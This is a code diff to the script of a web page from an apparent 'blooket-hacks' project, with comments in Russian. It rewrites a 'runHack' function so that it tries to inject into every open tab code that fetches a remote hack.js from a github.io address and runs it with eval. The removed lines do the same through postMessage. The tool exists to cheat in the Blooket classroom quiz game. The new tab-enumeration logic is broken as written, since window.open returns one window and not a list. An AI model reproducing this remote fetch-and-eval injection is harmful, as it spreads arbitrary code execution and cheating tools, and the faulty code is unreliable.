@@ -47,27 +47,35 @@
 
     <script>
         function runHack() {
-            // Отправляем сообщение ВСЕМ вкладкам
-            const message = { command: "RUN_HACK" };
-            window.postMessage(message, "*");
-            alert("✅ Hack command sent to all tabs!");
+            alert("✅ Sending hack command to all tabs!");
+
+            // Открываем новую вкладку, чтобы получить доступ ко всем окнам
+            const controllerTab = window.open("about:blank", "_blank");
+
+            // Запускаем интервал, чтобы искать все вкладки
+            const interval = setInterval(() => {
+                // Получаем все открытые окна
+                const tabs = window.open("", "_self");
+
+                if (tabs) {
+                    try {
+                        // Запускаем хак в каждой найденной вкладке
+                        tabs.forEach(tab => {
+                            tab.eval(`
+                                fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
+                                    .then(response => response.text())
+                                    .then(eval)
+                                    .catch(error => console.error('❌ Hack failed:', error));
+                            `);
+                        });
+                        clearInterval(interval);
+                        alert("🔥 Hack executed in all tabs!");
+                    } catch (error) {
+                        console.error("❌ Error accessing tabs:", error);
+                    }
+                }
+            }, 1000);
         }
-
-        function executeHack() {
-            // Загружаем и выполняем hack.js
-            fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
-                .then(response => response.text())
-                .then(eval)
-                .catch(error => console.error('❌ Hack failed:', error));
-        }
-
-        // Ждём сообщения от других вкладок
-        window.addEventListener("message", (event) => {
-            if (event.data.command === "RUN_HACK") {
-                executeHack();
-            }
-        });
-
     </script>
 
 </body>
